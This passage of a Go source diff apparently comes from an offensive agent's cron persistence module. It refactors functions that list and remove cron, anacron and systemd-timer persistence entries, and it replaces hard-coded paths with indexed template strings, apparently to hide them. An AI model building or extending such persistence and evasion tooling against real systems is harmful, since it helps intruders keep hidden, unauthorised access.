+	timerFile := filepath.Join(userDir, timerName+timerExt)
 
-	// Remove timer file
 	if err := os.Remove(timerFile); err == nil {
 		results = append(results, SuccCtx(S2, timerFile))
 	}
 
-	// Remove service file
 	if err := os.Remove(serviceFile); err == nil {
 		results = append(results, SuccCtx(S2, serviceFile))
 	}
@@ -775,54 +794,74 @@ func (c *CronPersistenceCommand) removeSystemdTimer() []string {
 func (c *CronPersistenceCommand) listCronPersistence() CommandResult {
 	var results []string
 
-	// Get detection pattern from template (or fallback) - trim the "# " prefix
-	comment := c.getTpl(tplCronComment)
-	detectPattern := strings.TrimPrefix(comment, "# ")
+	cronComment := c.getTpl(idxCronComment)
+	detectPattern := strings.TrimPrefix(cronComment, "# ")
 
-	// Check user crontabs
 	currentUser, _ := user.Current()
 	if currentUser != nil {
-		cronPaths := []string{
-			fmt.Sprintf(c.getTpl(tplCronSpoolCrontabs), currentUser.Username),
-			fmt.Sprintf(c.getTpl(tplCronSpoolCron), currentUser.Username),
-		}
+		spoolCrontabs := c.getTpl(idxCronSpoolCrontabs)
+		spoolCron := c.getTpl(idxCronSpoolCron)
 
-		for _, path := range cronPaths {
-			if content, err := os.ReadFile(path); err == nil {
-				if strings.Contains(string(content), detectPattern) {
-					results = append(results, SuccCtx(S6, path))
+		if spoolCrontabs != "" {
+			cronPaths := []string{
+				fmt.Sprintf(spoolCrontabs, currentUser.Username),
+				fmt.Sprintf(spoolCron, currentUser.Username),
+			}
+
+			for _, path := range cronPaths {
+				if content, err := os.ReadFile(path); err == nil {
+					if detectPattern != "" && strings.Contains(string(content), detectPattern) {
+						results = append(results, SuccCtx(S6, path))
+					}
 				}
 			}
 		}
 	}
 
-	// Check /etc/cron.d/
-	cronDFile := filepath.Join(c.getTpl(tplCronEtcCronD), c.getTpl(tplCronFileCheck))
-	if _, err := os.Stat(cronDFile); err == nil {
-		results = append(results, SuccCtx(S6, cronDFile))
-	}
-
-	// Check cron directories
-	for _, dir := range []string{c.getTpl(tplCronEtcHourly), c.getTpl(tplCronEtcDaily), c.getTpl(tplCronEtcWeekly), c.getTpl(tplCronEtcMonthly)} {
-		scriptPath := filepath.Join(dir, c.getTpl(tplCronFileUpdate))
-		if _, err := os.Stat(scriptPath); err == nil {
-			results = append(results, SuccCtx(S6, scriptPath))
+	cronDDir := c.getTpl(idxCronEtcCronD)
+	fileCheck := c.getTpl(idxCronFileCheck)
+	if cronDDir != "" && fileCheck != "" {
+		cronDFile := filepath.Join(cronDDir, fileCheck)
+		if _, err := os.Stat(cronDFile); err == nil {
+			results = append(results, SuccCtx(S6, cronDFile))
 		}
 	}
 
-	// Check anacrontab
-	anacronPath := c.getTpl(tplCronEtcAnacrontab)
-	if content, err := os.ReadFile(anacronPath); err == nil {
-		if strings.Contains(string(content), c.getTpl(tplCronFileMaint)) {
-			results = append(results, SuccCtx(S6, anacronPath))
+	fileUpdate := c.getTpl(idxCronFileUpdate)
+	if fileUpdate != "" {
+		dirs := []string{
+			c.getTpl(idxCronEtcHourly),
+			c.getTpl(idxCronEtcDaily),
+			c.getTpl(idxCronEtcWeekly),
+			c.getTpl(idxCronEtcMonthly),
+		}
+		for _, dir := range dirs {
+			if dir == "" {
+				continue
+			}
+			scriptPath := filepath.Join(dir, fileUpdate)
+			if _, err := os.Stat(scriptPath); err == nil {
+				results = append(results, SuccCtx(S6, scriptPath))
+			}
 		}
 	}
 
-	// Check systemd user timer
-	if currentUser != nil {
-		userDir := filepath.Join(currentUser.HomeDir, c.getTpl(tplTimerUserDir))
-		timerName := c.getTpl(tplTimerDefaultName)
-		timerFile := filepath.Join(userDir, timerName+c.getTpl(tplTimerExt))
+	anacronPath := c.getTpl(idxCronEtcAnacrontab)
+	fileMaint := c.getTpl(idxCronFileMaint)
+	if anacronPath != "" && fileMaint != "" {
+		if content, err := os.ReadFile(anacronPath); err == nil {
+			if strings.Contains(string(content), fileMaint) {
+				results = append(results, SuccCtx(S6, anacronPath))
+			}
+		}
+	}
+
+	timerUserDir := c.getTpl(idxTimerUserDir)
+	timerName := c.getTpl(idxTimerDefaultName)
+	timerExt := c.getTpl(idxTimerExt)
+	if currentUser != nil && timerUserDir != "" && timerName != "" {
+		userDir := filepath.Join(currentUser.HomeDir, timerUserDir)
+		timerFile := filepath.Join(userDir, timerName+timerExt)
 		if _, err := os.Stat(timerFile); err == nil {
 			results = append(results, SuccCtx(S6, timerFile))
 		}
